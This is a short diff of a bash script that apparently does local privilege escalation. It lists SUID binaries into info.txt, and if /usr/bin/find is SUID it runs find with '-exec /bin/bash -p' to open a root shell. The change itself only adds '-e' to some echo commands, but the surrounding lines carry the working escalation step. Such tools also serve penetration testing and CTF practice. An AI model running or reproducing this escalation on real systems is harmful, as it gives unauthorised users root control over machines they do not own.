@@ -51,8 +51,8 @@ if [ $answer = n ] ; then
 	echo '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
 else
 	find / -perm -u=s -type f 2>/dev/null >> info.txt
-	echo '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
-	echo '\E[32;40m' "This could take a while, script is not stuck"; tput sgr0
+	echo -e '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
+	echo -e '\E[32;40m' "This could take a while, script is not stuck"; tput sgr0
 	if grep "/usr/bin/find" info.txt; then
 		cd /usr/bin
 		./find . -exec /bin/bash -p \; -quit
